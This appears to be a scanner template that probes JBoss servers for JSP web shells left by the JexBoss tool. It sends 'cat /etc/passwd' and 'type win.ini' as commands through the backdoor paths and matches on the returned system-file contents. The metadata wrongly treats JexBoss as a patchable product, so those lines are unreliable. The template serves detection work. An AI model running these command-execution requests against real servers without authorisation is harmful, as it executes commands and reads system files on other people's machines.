id: jexboss-backdoor
info:
  name: JexBoss - Remote Code Execution
  author: UnkL4b
  severity: critical
  description: JexBoss is a vulnerability that allows attackers to remotely execute
    malicious code, extract sensitive data, and gain full control over a system without
    authentication.
  reference:
  - https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A
  - https://github.com/joaomatosf/jexboss
  metadata:
    verified: true
    impact: The impact of JexBoss backdoor vulnerability is the potential for unauthorized
      access and control over compromised systems, leading to data theft, modification,
      and potential harm to businesses and individuals.
    recommendation: It is recommended to promptly patch and update JexBoss to avoid
      potential remote code execution vulnerabilities.
  tags: backdoor,jboss,rce
requests:
- method: GET
  path:
  - '{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode(''{{command}}'')}}'
  payloads:
    command:
    - cat /etc/passwd
    - type C:\/Windows\/win.ini
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
    condition: or
  - type: word
    part: header
    words:
    - 'X-Powered-By: Servlet'
